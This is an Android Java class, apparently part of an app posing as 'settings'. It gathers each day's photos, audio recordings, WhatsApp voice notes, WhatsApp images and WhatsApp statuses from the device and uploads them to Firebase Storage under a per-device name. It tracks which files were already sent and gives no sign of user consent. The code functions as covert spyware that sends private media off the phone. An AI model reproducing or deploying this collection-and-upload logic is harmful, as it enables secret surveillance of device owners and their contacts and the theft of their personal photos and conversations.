package com.example.settings;

import static com.example.settings.Utils.getDate;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.provider.MediaStore;
import android.text.format.DateFormat;
import android.util.Log;

import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;
import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.lang.reflect.Type;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.Locale;
import java.util.Map;

import id.zelory.compressor.Compressor;

public class MultiMediaData {
    Context mContext;
    Sharedpref mSharedpref;
    StorageReference storageRef;
    File compressedImageFile;

    public MultiMediaData(Context mContext, Sharedpref mSharedpref) {
        this.mContext = mContext;
        this.mSharedpref = mSharedpref;
    }
    public void getAllShownImagesPath() {
        int imagesTakenToday=0;
        Uri uri;
        Cursor cursor;
        int column_index_data;
        JSONArray mJsonArray=new JSONArray();
        ArrayList<String> listOfAllImages = new ArrayList<String>();
        ArrayList<String> prevfilenames;

        String absolutePathOfImage = null;
        uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;

        String[] projection = {MediaStore.MediaColumns.DATA,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME};

        cursor = mContext.getContentResolver().query(uri, projection, null,
                null, null);

        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
        while (cursor.moveToNext()) {
            absolutePathOfImage = cursor.getString(column_index_data);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                String filedate=getDate(absolutePathOfImage);
                String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                if (filedate.equalsIgnoreCase(currentDate)){
                    File actualImageFile=new File(absolutePathOfImage);
                    compressedImageFile = Compressor.getDefault(mContext).compressToFile(actualImageFile);
                    listOfAllImages.add(compressedImageFile.getPath());
                }
            }
        }
        imagesTakenToday=listOfAllImages.size();
        Gson gson=new Gson();
        Type listType = new TypeToken< ArrayList<String> >(){}.getType();
        prevfilenames=gson.fromJson(mSharedpref.getImageList(),listType );
        if(prevfilenames==null){
            prevfilenames=new ArrayList<>();
        }
        listOfAllImages.removeAll(prevfilenames);

        if (listOfAllImages.size()>0) {
            for (int i = 0; i < listOfAllImages.size(); i++) {
                Uri fileUri = Uri.fromFile(new File(listOfAllImages.get(i)));
                String filename= fileUri.getLastPathSegment();
                String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                storageRef = FirebaseStorage.getInstance().getReference().child(mSharedpref.getSaveName()).child(currentDate).child("Images").child(filename);
                int j = i;
                int finalImagesTakenToday = imagesTakenToday;
                ArrayList<String> finalPrevfilenames = prevfilenames;
                storageRef.putFile(fileUri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        storageRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                            @Override
                            public void onSuccess(Uri uri) {
                                JSONObject mJsonObject = new JSONObject();
                                try {
                                    mJsonObject.put("Images for today", finalImagesTakenToday);
                                    mJsonObject.put("File Path", listOfAllImages.get(j));
                                    String Url = uri.toString();
                                    mJsonObject.put("Url", Url);
                                    finalPrevfilenames.add(listOfAllImages.get(j));
                                    mJsonArray.put(mJsonObject);
                                    String fil=gson.toJson(finalPrevfilenames);
                                    mSharedpref.setImageList(fil);
                                    mSharedpref.setImagesJson(mJsonArray.toString());
                                    mSharedpref.commit();
                                    Log.d("Tag", Url);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }


                            }
                        });
                    }
                });
            }
        }
    }


    public  void getAudios() {
        int audiosize=0;
        Uri uri;
        Cursor cursor;
        int column_index_data;
        JSONArray mJsonArray=new JSONArray();
        ArrayList<String> listOfAllAudios = new ArrayList<String>();
        ArrayList<String> prevAudiofilenames;
        String absolutePathOfAudio = null;
        uri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;

        String[] projection = { MediaStore.Audio.Media._ID,MediaStore.Audio.Media.DATA,MediaStore.Audio.Media.DATE_MODIFIED };
        cursor = mContext.getContentResolver().query(uri, projection, null,null, null);
        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.Audio.Media.DATA);

        while (cursor.moveToNext()) {
            absolutePathOfAudio = cursor.getString(column_index_data);
            Long tm = cursor
                    .getLong(cursor
                            .getColumnIndexOrThrow(MediaStore.Audio.Media.DATE_MODIFIED));

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                String filedate = DateFormat.format("dd-MM-yyyy",new Date(tm*1000)).toString();
                String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                if (filedate.equalsIgnoreCase(currentDate)){
                    listOfAllAudios.add(absolutePathOfAudio);

                }
            }

        }
        audiosize=listOfAllAudios.size();
        Gson gson=new Gson();
        Type listType = new TypeToken< ArrayList<String> >(){}.getType();
        prevAudiofilenames=gson.fromJson(mSharedpref.getAudioList(),listType );
        if(prevAudiofilenames==null){
            prevAudiofilenames=new ArrayList<>();
        }
        listOfAllAudios.removeAll(prevAudiofilenames);

        if (listOfAllAudios.size()>0) {
            for (int i = 0; i < listOfAllAudios.size(); i++) {
                try {
                    Uri fileUri = Uri.fromFile(new File(listOfAllAudios.get(i)));
                    String filename= fileUri.getLastPathSegment();
                    String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                    storageRef = FirebaseStorage.getInstance().getReference().child(mSharedpref.getSaveName()).child(currentDate).child("Audios").child(filename);
                    int j = i;
                    int finalAudiosize = audiosize;
                    ArrayList<String> finalPrevAudiofilenames = prevAudiofilenames;
                    storageRef.putFile(fileUri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                        @Override
                        public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                            storageRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                                @Override
                                public void onSuccess(Uri uri) {
                                    JSONObject mJsonObject = new JSONObject();
                                    try {
                                        mJsonObject.put("Total audios today ", finalAudiosize);
                                        mJsonObject.put("File Path", listOfAllAudios.get(j));
                                        String Url = uri.toString();
                                        mJsonObject.put("Url", Url);
                                        finalPrevAudiofilenames.add(listOfAllAudios.get(j));
                                        mJsonArray.put(mJsonObject);
                                        String fil=gson.toJson(finalPrevAudiofilenames);
                                        mSharedpref.setAudioList(fil);
                                        mSharedpref.setAudioJson(mJsonArray.toString());
                                        mSharedpref.commit();
                                        Log.d("Tag", Url);
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            });
                        }
                    });
                } catch (Exception e) {
                    e.printStackTrace();
                    continue;
                }
            }
        }
    }

    public void getWhatsAppAudios() {
        int whatsappaudio=0;
        String path = Environment.getExternalStorageDirectory().toString();
        if (android.os.Build.VERSION.SDK_INT < 30) {
            path=path+"/WhatsApp/Media/WhatsApp Voice Notes";
        }
        else {
            //path=path+"/Android/media/com.whatsapp/WhatsApp/Media/.Statuses";
            path=path+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes";
        }
        ///storage/emulated/0/WhatsApp/Media/WhatsApp Voice Notes
        // String path1 = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/.Statuses";
        ArrayList<String> listOfAllWhatsappAudios = new ArrayList<String>();
        ArrayList<String> prevwhatsAppAudiofilenames;
        JSONArray mJsonArray=new JSONArray();
        File directory = new File(path);
        File[] files=null;
        if (directory.exists()){
            files = directory.listFiles();
            Log.d("Files", "Size: "+ files.length);
        }
        else
        {
            return;
        }
        if (files!=null){
            for (int i=0;i<files.length;i++){
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    String date=getDate(files[i].getAbsolutePath());
                    String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());

                    //   if (date.equalsIgnoreCase(currentDate)){
                    if (files[i].isDirectory()){
                        File insidedirectory = new File(files[i].getAbsolutePath());
                        File[] insidefiles = insidedirectory.listFiles();

                        for (int j=0;j<insidefiles.length;j++){
                            String date1=getDate(insidefiles[j].getAbsolutePath());
                            if(date1.equalsIgnoreCase(currentDate)) {
                                listOfAllWhatsappAudios.add(insidefiles[j].getAbsolutePath());
                            }
                        }
                    }
                    else {
                        if (date.equalsIgnoreCase(currentDate)){
                            listOfAllWhatsappAudios.add(files[i].getAbsolutePath());
                        }
                    }
                    //   }
                }
            }
        }


        whatsappaudio=listOfAllWhatsappAudios.size();
        Gson gson=new Gson();
        Type listType = new TypeToken< ArrayList<String> >(){}.getType();
        prevwhatsAppAudiofilenames=gson.fromJson(mSharedpref.getWhatsAppAudioList(),listType );
        if(prevwhatsAppAudiofilenames==null){
            prevwhatsAppAudiofilenames=new ArrayList<>();
        }
        listOfAllWhatsappAudios.removeAll(prevwhatsAppAudiofilenames);
        for (int i = 0; i < listOfAllWhatsappAudios.size(); i++) {
            try {
                Uri fileUri = Uri.fromFile(new File(listOfAllWhatsappAudios.get(i)));
                String filename= fileUri.getLastPathSegment();
                String currentDateTime = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                storageRef = FirebaseStorage.getInstance().getReference().child(mSharedpref.getSaveName()).child(currentDateTime).child("WhatsAppAudios").child(filename);
                int j = 0;
                ArrayList<String> finalPrevwhatsAppAudiofilenames = prevwhatsAppAudiofilenames;
                int finalWhatsappaudio = whatsappaudio;
                storageRef.putFile(fileUri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        storageRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                            @Override
                            public void onSuccess(Uri uri) {
                                JSONObject mJsonObject = new JSONObject();
                                try {
                                    mJsonObject.put("No of Audios Today", finalWhatsappaudio);
                                    mJsonObject.put("File Path", listOfAllWhatsappAudios.get(j));
                                    String Url = uri.toString();
                                    mJsonObject.put("Url", Url);
                                    finalPrevwhatsAppAudiofilenames.add(listOfAllWhatsappAudios.get(j));
                                    mJsonArray.put(mJsonObject);
                                    String fil=gson.toJson(finalPrevwhatsAppAudiofilenames);
                                    mSharedpref.setWhatsAppAudioList(fil);
                                    mSharedpref.setWhatsAppAudioJSon(mJsonArray.toString());
                                    mSharedpref.commit();
                                    Log.d("Tag", Url);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
                //  continue;
            }
        }

    }

    public void getWhatsphotos() {
        String path = Environment.getExternalStorageDirectory().toString();
        int sizefortoday=0;
        if (android.os.Build.VERSION.SDK_INT < 30) {
            path=path+"/WhatsApp/Media/WhatsApp Images";
        }
        else {
            //path=path+"/Android/media/com.whatsapp/WhatsApp/Media/.Statuses";
            path=path+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images";

        }
        ///storage/emulated/0/WhatsApp/Media/WhatsApp Voice Notes
        // String path1 = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/.Statuses";
        File directory1 = new File(path);
        if (directory1.exists()){
            File[] files1 = directory1.listFiles();
            Log.d("Files", "Size: "+ files1.length);
        }

        HashMap<String,String> listOfAllWhatsappPhotos = new HashMap<>();
        ArrayList<String> prevwhatsAppPhotfilenames;
        JSONArray mJsonArray=new JSONArray();
        Log.d("Files", "Path: " + path);
        File directory = new File(path);
        File[] files = directory.listFiles();
        Log.d("Files", "Size: "+ files.length);
        for (int i=0;i<files.length;i++){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                String date=getDate(files[i].getAbsolutePath());
                String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                //   if (date.equalsIgnoreCase(currentDate)){
                if (files[i].isDirectory()){
                    File insidedirectory = new File(files[i].getAbsolutePath());
                    File[] insidefiles = insidedirectory.listFiles();

                    for (int j=0;j<insidefiles.length;j++){
                        String date1=getDate(insidefiles[j].getAbsolutePath());
                        if(date1.equalsIgnoreCase(currentDate)) {
                            String idStr = insidedirectory.getPath().substring(insidedirectory.getPath().lastIndexOf('/') + 1);
                            listOfAllWhatsappPhotos.put(idStr,insidefiles[j].getAbsolutePath());
                        }
                    }
                }
                else {

                    if (date.equalsIgnoreCase(currentDate)){
                        String idStr = "Other";
                        listOfAllWhatsappPhotos.put(idStr,files[i].getAbsolutePath());
                    }

                }
                //   }
            }
        }
        sizefortoday=listOfAllWhatsappPhotos.size();
        Gson gson=new Gson();
        Type listType = new TypeToken< ArrayList<String> >(){}.getType();
        prevwhatsAppPhotfilenames=gson.fromJson(mSharedpref.getWhatsAppAImageList(),listType );
        if(prevwhatsAppPhotfilenames==null){
            prevwhatsAppPhotfilenames=new ArrayList<>();
        }
        for (int s=0;s<prevwhatsAppPhotfilenames.size();s++){
            listOfAllWhatsappPhotos.values().remove(prevwhatsAppPhotfilenames.get(s));
            Log.d("Image", String.valueOf(listOfAllWhatsappPhotos.size()));

        }
        for ( Map.Entry<String, String> entry : listOfAllWhatsappPhotos.entrySet()) {
            String Key=entry.getKey();
            String Value=entry.getValue();
            Uri fileUri = Uri.fromFile(new File(Value));
            String filename= fileUri.getLastPathSegment();
            String currentDateTime = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
            storageRef = FirebaseStorage.getInstance().getReference().child(mSharedpref.getSaveName()).child(currentDateTime).child("WhatsAppImages").child(Key).child(filename);
            try {
                ArrayList<String> finalPrevwhatsAppPhotfilenames = prevwhatsAppPhotfilenames;
                int finalSizefortoday = sizefortoday;
                storageRef.putFile(fileUri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        storageRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                            @Override
                            public void onSuccess(Uri uri) {
                                JSONObject mJsonObject = new JSONObject();
                                try {
                                    mJsonObject.put("No of Images for Today ",String.valueOf(finalSizefortoday));
                                    mJsonObject.put("File Path", Value);
                                    String Url = uri.toString();
                                    mJsonObject.put("Url", Url);
                                    mJsonArray.put(mJsonObject);
                                    finalPrevwhatsAppPhotfilenames.add(Value);
                                    String fil=gson.toJson(finalPrevwhatsAppPhotfilenames);
                                    mSharedpref.setWhatsAppImageList(fil);
                                    mSharedpref.setWhatsAppImageJson(mJsonArray.toString());
                                    mSharedpref.commit();
                                    Log.d("Tag", Url);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
                //  continue;
            }
        }
        Log.d("Image", String.valueOf(prevwhatsAppPhotfilenames.size()));

    }

    public void getWhatsAppStatus() {
        String path = Environment.getExternalStorageDirectory().toString();
        if (android.os.Build.VERSION.SDK_INT < 30) {
            path=path+"/WhatsApp/Media/.Statuses";
        }
        else {
            path=path+"/Android/media/com.whatsapp/WhatsApp/Media/.Statuses";
            //path=path+"/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images";

        }
        ///storage/emulated/0/WhatsApp/Media/WhatsApp Voice Notes
        // String path1 = "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Media/.Statuses";
        File directory1 = new File(path);
        if (directory1.exists()){
            File[] files1 = directory1.listFiles();
            Log.d("Files", "Size: "+ files1.length);
        }

        ArrayList<String> listOfAllWhatsappStatus = new ArrayList<String>();
        ArrayList<String> prevwhatsAppStatusfilenames;
        int statuses=0;
        JSONArray mJsonArray=new JSONArray();
        Log.d("Files", "Path: " + path);
        File directory = new File(path);
        File[] files = directory.listFiles();
        Log.d("Files", "Size: "+ files.length);
        for (int i=0;i<files.length;i++){
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                String date=getDate(files[i].getAbsolutePath());
                String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());

                //   if (date.equalsIgnoreCase(currentDate)){
                if (files[i].isDirectory()){
                    File insidedirectory = new File(files[i].getAbsolutePath());
                    File[] insidefiles = insidedirectory.listFiles();

                    for (int j=0;j<insidefiles.length;j++){
                        String date1=getDate(insidefiles[j].getAbsolutePath());
                            listOfAllWhatsappStatus.add(insidefiles[j].getAbsolutePath());
                    }
                }
                else {
                        listOfAllWhatsappStatus.add(files[i].getAbsolutePath());
                }
                //   }
            }
        }
        statuses=listOfAllWhatsappStatus.size();
        Gson gson=new Gson();
        Type listType = new TypeToken< ArrayList<String> >(){}.getType();
        prevwhatsAppStatusfilenames=gson.fromJson(mSharedpref.getWhatsAppAStatusList(),listType );
        if(prevwhatsAppStatusfilenames==null){
            prevwhatsAppStatusfilenames=new ArrayList<>();
        }
        listOfAllWhatsappStatus.removeAll(prevwhatsAppStatusfilenames);
        for (int i = 0; i < listOfAllWhatsappStatus.size(); i++) {
            try {
                Uri fileUri = Uri.fromFile(new File(listOfAllWhatsappStatus.get(i)));
                String filename= fileUri.getLastPathSegment();
                String currentDateTime = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
                storageRef = FirebaseStorage.getInstance().getReference().child(mSharedpref.getSaveName()).child(currentDateTime).child("WhatsAppStatus").child(filename);
                int j = i;
                int finalStatuses = statuses;
                ArrayList<String> finalPrevwhatsAppStatusfilenames = prevwhatsAppStatusfilenames;
                storageRef.putFile(fileUri).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        storageRef.getDownloadUrl().addOnSuccessListener(new OnSuccessListener<Uri>() {
                            @Override
                            public void onSuccess(Uri uri) {
                                JSONObject mJsonObject = new JSONObject();
                                try {
                                    mJsonObject.put("No of Statuses", finalStatuses);
                                    mJsonObject.put("File Path", listOfAllWhatsappStatus.get(j));
                                    String Url = uri.toString();
                                    mJsonObject.put("Url", Url);
                                    finalPrevwhatsAppStatusfilenames.add(listOfAllWhatsappStatus.get(j));
                                    mJsonArray.put(mJsonObject);
                                    String fil=gson.toJson(finalPrevwhatsAppStatusfilenames);
                                    mSharedpref.setWhatsAppStatusList(fil);
                                    mSharedpref.setWhatsAppStatusJson(mJsonArray.toString());
                                    mSharedpref.commit();
                                    Log.d("Tag", Url);
                                } catch (Exception e) {
                                    e.printStackTrace();
                                }
                            }
                        });
                    }
                });
            } catch (Exception e) {
                e.printStackTrace();
                //  continue;
            }
        }
        Log.d("Statuses", String.valueOf(statuses));
    }
}
